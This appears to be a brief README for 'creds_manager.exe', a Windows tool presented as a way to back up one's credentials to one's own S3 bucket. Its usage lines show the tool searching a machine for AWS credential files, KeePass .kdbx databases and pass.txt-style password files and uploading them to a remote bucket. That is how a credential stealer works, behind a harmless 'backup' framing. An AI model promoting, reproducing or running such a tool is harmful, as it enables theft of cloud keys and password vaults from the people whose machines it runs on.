creds_manager.exe can be used to quikly save your most precious credentials into your own S3 bucket !
Usage of creds_manager.exe :
```powershell
creds_manager.exe
  --bucket xxxxxxx
  --access-key-id xxxxxxx
  --secret-key xxxxxxx
  -f credentials --> Will look for credentials, usualy found in %userprofile%\.aws\*
  -f *.kdbx" --> Will look for .kdbx files, used to store your KeePass passwords
  -f pass.txt --> Will look for "pass.txt" files or derivatives (passwords.txt, pwd.txt, ...)
``` 
